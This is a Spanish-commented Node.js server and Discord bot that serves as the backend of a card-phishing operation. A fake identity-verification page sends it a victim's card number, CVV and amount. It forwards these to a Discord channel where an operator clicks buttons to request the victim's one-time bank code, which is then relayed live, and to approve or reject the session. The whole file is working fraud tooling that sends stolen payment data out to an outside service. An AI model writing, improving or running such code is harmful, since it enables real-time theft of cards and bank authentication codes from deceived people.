require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');

const app = express();
app.use(cors());
app.use(express.json());

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const DISCORD_CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
const PORT = process.env.PORT || 3000;

const sesiones = new Map();

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Bot conectado como ${client.user.tag}`);
});

client.login(DISCORD_TOKEN);

// 1. Endpoint que recibe la tarjeta desde verificaciondeidentidad.html
app.post('/nuevo', async (req, res) => {
    try {
        const { userId, tarjeta, codigo, monto } = req.body;
        if (!userId || !tarjeta) return res.status(400).json({ ok: false });

        sesiones.set(userId, {
            userId, tarjeta, codigo: codigo || '', monto: monto || '0',
            estado: 'pending', otp: null, discordMsgId: null
        });

        const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
        const embed = new EmbedBuilder()
            .setTitle('💳 Nueva tarjeta recibida')
            .setColor(0xda0081)
            .addFields(
                { name: '🆔 User ID', value: `\`${userId}\``, inline: false },
                { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: true },
                { name: '🔒 CVV', value: `\`${codigo}\``, inline: true },
                { name: '💵 Monto', value: `$${monto}`, inline: true }
            )
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`otp_${userId}`).setLabel('📱 Pedir Dinámica').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`reject_${userId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
        );

        const msg = await channel.send({ embeds: [embed], components: [row] });
        const s = sesiones.get(userId);
        s.discordMsgId = msg.id;
        sesiones.set(userId, s);

        res.json({ ok: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// 2. Endpoint que recibe la dinámica (OTP) del usuario
app.post('/otp/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { otp } = req.body;
        const s = sesiones.get(userId);
        if (!s) return res.status(404).json({ ok: false });

        s.otp = otp;
        s.estado = 'otp_received';
        sesiones.set(userId, s);

        if (s.discordMsgId) {
            const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
            const msg = await channel.messages.fetch(s.discordMsgId);
            const embed = EmbedBuilder.from(msg.embeds[0]).addFields(
                { name: '📱 Dinámica recibida', value: `\`${otp}\``, inline: false }
            );
            await msg.edit({ embeds: [embed] });
        }
        res.json({ ok: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ ok: false });
    }
});

// 3. Endpoint que consulta espera.html cada 2 segundos
app.get('/estado/:userId', (req, res) => {
    const s = sesiones.get(req.params.userId);
    if (!s) return res.json({ estado: 'pending' });
    res.json({ estado: s.estado, otp: s.otp || null });
});

// 4. Escuchar los clics de los botones en Discord
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    const [action, userId] = interaction.customId.split('_');
    const s = sesiones.get(userId);
    
    if (!s) return interaction.reply({ content: '❌ Sesión no encontrada o expirada.', ephemeral: true });

    if (action === 'otp') {
        s.estado = 'otp';
        sesiones.set(userId, s);
        await interaction.reply({ content: `📱 Dinámica solicitada al usuario.`, ephemeral: true });
    } else if (action === 'approve') {
        s.estado = 'approved';
        sesiones.set(userId, s);
        await interaction.reply({ content: `✅ Usuario aprobado.`, ephemeral: true });
    } else if (action === 'reject') {
        s.estado = 'rejected';
        sesiones.set(userId, s);
        await interaction.reply({ content: `❌ Usuario rechazado.`, ephemeral: true });
    }
});

app.listen(PORT, () => console.log(`🚀 Servidor HTTP en puerto ${PORT}`));